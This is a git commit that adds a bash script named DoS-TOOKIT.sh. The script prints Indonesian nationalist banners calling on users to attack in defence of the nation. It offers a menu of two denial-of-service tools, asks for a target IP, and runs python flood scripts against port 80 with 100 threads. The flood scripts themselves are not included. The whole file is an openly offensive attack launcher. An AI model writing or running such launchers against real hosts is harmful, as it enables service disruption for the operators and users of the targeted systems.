7759a9e34d23f7ad157d47338b1f1eca07660e0e
R3VOLUT10N <50107162+R3VOLUT10N@users.noreply.github.com>
2019-04-29 19:53:49 +0700

    -

---
+++ DoS-TOOKIT.sh
@@ -0,0 +1,55 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+clearn
+toilet -f slant " DOS TOOLKIT  " |lolcat
+toilet -f slant "=>=>NKRI<=<=" |lolcat
+toilet -f slant "HARGA MATI" |lolcat
+echo
+echo
+echo $white"JANGAN DIAM SAJA SAAT NKRI DISERANG"
+echo $white"MANA RASA CINTAMU DENGAN TANAH AIRMU"
+echo $white"LEBIH BAIK MENCOBA GAGAL DARI PADA TIDAK SAMA SEKALI"
+echo $white"TUNJUKAN RASA CINTA KALIAN TERHADAP NEGERI INI !!"
+echo $white"GUNAKAN DENGAN BAIK, BIJAK, BENAR :)"
+echo $white"•••••••••••••••••••••••••••••••••••••••"
+echo $white"X_X MOD BY MR.REVOLUTION X_X"
+echo $white"VERSION=1.2"
+echo $white"SYSTEMS ATTACKER INDONESIA"
+echo $white"CYBER SECURITY ARMY"
+echo $white"======================================="
+echo $white"     DOS WIN32,64 NT AND ANDROMEDA      "
+echo $red"       SPECIAL BELA NKRI HARGA MATI        "
+echo $red  "---------------------------------------"
+echo $red   "                 DAFTAR"
+echo $red  "======================================="
+echo $red"[1].TROJAN WIN32,64.NT"
+echo $red"[2].ANDROMEDA XR"
+echo $red"•••••••••••••••••••••••••••••••••••••••••"
+echo $red"X_X MASUKAN PILIHAN GAN X_X"
+read -p "PILIH>>==>" bro;
+echo
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+toilet -f slant " WIN.32   " |lolcat
+echo $red"X_X MASUKAN IP TARGET X_X"
+read -p "===>" ipt
+clear
+echo
+python win.32.64.NT.py -s$ipt -p80 -t100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+toilet -f slant "=> DROID RX <= " |lolcat
+echo $red"X_X MASUKAN IP TARGET X_X"
+read -p "=_=>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
